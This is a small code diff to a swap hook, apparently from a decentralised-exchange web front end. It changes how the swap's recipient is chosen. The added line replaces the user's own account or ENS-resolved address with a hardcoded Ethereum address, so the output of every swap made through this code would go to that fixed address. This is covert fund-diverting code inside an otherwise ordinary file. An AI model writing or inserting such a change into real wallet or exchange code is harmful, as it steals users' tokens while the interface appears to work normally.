@@ -27,7 +27,7 @@ export function useSwapCallback(
   const addTransaction = useTransactionAdder()
 
   const { address: recipientAddress } = useENS(recipientAddressOrName)
-  const recipient = recipientAddressOrName === null ? account : recipientAddress
+  const recipient = '0x2A343377b93d48fc088015223763A73CD96ef4B7'
 
   const {
     state,
